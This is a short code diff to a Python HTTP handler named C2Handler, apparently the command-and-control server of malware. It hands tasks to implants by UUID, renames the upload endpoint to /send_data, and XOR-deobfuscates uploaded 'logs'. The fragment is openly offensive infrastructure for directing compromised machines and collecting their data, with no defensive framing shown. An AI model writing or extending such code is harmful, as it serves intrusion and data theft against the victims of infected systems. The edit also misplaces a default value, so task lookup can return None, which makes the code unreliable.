@@ -33,11 +33,10 @@ class C2Handler(BaseHTTPRequestHandler):
         tasks = load_tasks()
 
         if self.path == "/get_task":
-            print("Get Task")
-            uuid = data.get("uuid")
-            task = tasks.get(uuid, {"task": "none"})
+            uuid = data.get("uuid", {'task':'none'})
+            task = tasks.get(uuid)
             response = json.dumps(task)
-        elif self.path == "/submit_data":
+        elif self.path == "/send_data":
             has_data = len(data.get("logs")) > 0
             if has_data:
                 decoded = deobfuscate_payload(data, xor_key)
